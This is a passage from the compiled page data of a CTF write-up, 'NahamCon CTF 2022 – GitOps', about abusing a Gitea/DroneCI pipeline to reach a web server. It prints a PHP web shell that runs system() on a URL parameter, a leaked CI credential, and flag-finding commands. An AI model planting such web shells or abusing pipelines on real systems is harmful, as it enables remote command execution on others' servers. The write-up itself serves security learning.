attr-name\",children:\"name\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"<?php\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"basename\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_SERVER\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'PHP_SELF'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?>\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"input\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"type\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"TEXT\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"name\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"cmd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"id\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"cmd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"size\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"80\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"input\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"type\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"SUBMIT\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"value\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"Execute\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"</\"}),\"form\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"<?php\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"isset\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_GET\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'cmd'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token function\",children:\"system\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_GET\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'cmd'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token php language-php\",children:(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?>\"})}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"</\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"<?php\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token function\",children:\"phpinfo\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token php language-php\",children:(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?>\"})}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"</\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Repeat previous steps to modify \",(0,e.jsx)(n.code,{children:\"drone.yml\"}),\" but instead change \",(0,e.jsx)(n.code,{children:\"index.php\"}),\", Once the commit is made, you need to ask for a pull request\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/PullRequest.png\",alt:\"Create Pull Request\"})}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Then Disconnect from the \",(0,e.jsx)(n.em,{children:\"developer\"}),\" account and connect with the credentials founds previously \",(0,e.jsx)(n.code,{children:\"droneci:t4K0@s!qSF\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We now need to peer review the commit from \",(0,e.jsx)(n.em,{children:\"developer\"}),\" account asking to be merged into master\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/peer_review.png\",alt:\"Approve Commit made by Developer\"})}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Now the final step, we need to actually create a merge commit to the master branch\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/Merge.png\",alt:\"Merged to master branch\"})}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Confirm the malicious \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" has been pushed to the webserver\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now is the final check, Cross your fingers and navigate to \",(0,e.jsx)(n.code,{children:\"Web.challenge.nahamcon.com\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/phpinfo.png\",alt:\"Reverse Shell Testing\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"At first, we thought me might need to find some privilege escalation vulnerability on the web server to gain root access then grab the flag, we create a reverse shell from the Webserver, but after quick enumeration, we found the flag on the system root and were able to read it with user \",(0,e.jsx)(n.code,{children:\"www-data\"}),\". So instead of creating a new reverse shell, you can use \",(0,e.jsx)(n.code,{children:\"find\"}),\" and \",(0,e.jsx)(n.code,{children:\"cat\"}),\" to grab the flag.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`find / -name *.txt -type f\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`cat /flag.txt\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/find_flag.png\",alt:\"Finding the flag\"}),`\n`,(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/flag.png\",alt:\"Grabbing the Flag\"})]})]})}}var w=b;return v;})();\n;return Component;","toc":[{"value":"GitOps","url":"#gitops","depth":1},{"value":"Challenge Summary","url":"#challenge-summary","depth":2},{"value":"Initial Reconnaissance","url":"#initial-reconnaissance","depth":2},{"value":"Testing for Remote Code Execution","url":"#testing-for-remote-code-execution","depth":2},{"value":"Bonus: How to get command output without webhook","url":"#bonus-how-to-get-command-output-without-webhook","depth":2},{"value":"Getting Reverse shell","url":"#getting-reverse-shell","depth":2},{"value":"Stripped output Response","url":"#stripped-output-response","depth":3},{"value":"Key Points","url":"#key-points","depth":3},{"value":"Generating the payload","url":"#generating-the-payload","depth":3},{"value":"Post Exploitation","url":"#post-exploitation","depth":2},{"value":"Pivoting to Web Server","url":"#pivoting-to-web-server","depth":2},{"value":"Confirm the malicious index.php has been pushed to the webserver","url":"#confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver","depth":3}],"frontMatter":{"readingTime":{"text":"9 min read","minutes":8.945,"time":536700,"words":1789},"slug":"nahamcon-ctf-2022/gitops","fileName":"nahamcon-ctf-2022/gitops.md","title":"NahamCon CTF 2022 – GitOps","date":"2022-05-02T00:00:00.000Z","draft":false,"authors":["TheButcher"],"tags":["NahamCon CTF 2022","Misc","DevOps","Git","Pipeline","Gitea","DroneCI"],"summary":"Abuse the pipeline execution process to gain access to the host."}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.17,"time":10200,"words":34},"slug":["TheButcher"],"fileName":"TheButcher.md","name":"TheButcher","avatar":"https://www.gravatar.com/avatar/711bcc9351488f059a9973474447df76?d=identicon&s=256","specialties":["Misc","OSINT"],"member":true,"retired":true,"description":"Always Try Harder","order":1,"date":null}],"prev":{"title":"Crew CTF 2022 – EzChall & EzChall Again","date":"2022-04-17T00:00:00.000Z","draft":false,"authors":["elleuch"],"tags":["CREW CTF 2022","Web","SSTI","Filter","WAF","Blacklist"],"summary":"Blind SSTI with filters","slug":"crew-ctf-2022/EzChall"},"next":{"title":"San Diego CTF 2022 – Tasty Crypto Roll","date":"2022-05-10T00:00:00.000Z","draft":false,"authors":["deuterium"],"tags":["SDCTF 2022","Crypto","Cryptography","AES","z3","substitution","permutation"],"summary":"Exploiting the structure of sbox used and finding the inverse substitution mapping using z3.","canonical":"https://deut-erium.github.io/ctf-writeups-2022/ctf2022/sdctf/tasty_crypto_roll/2022-05-10-SDCTF-Tasty-Crypto-Roll","slug":"sdctf-2022/crypto-roll"}},"__N_SSG":true}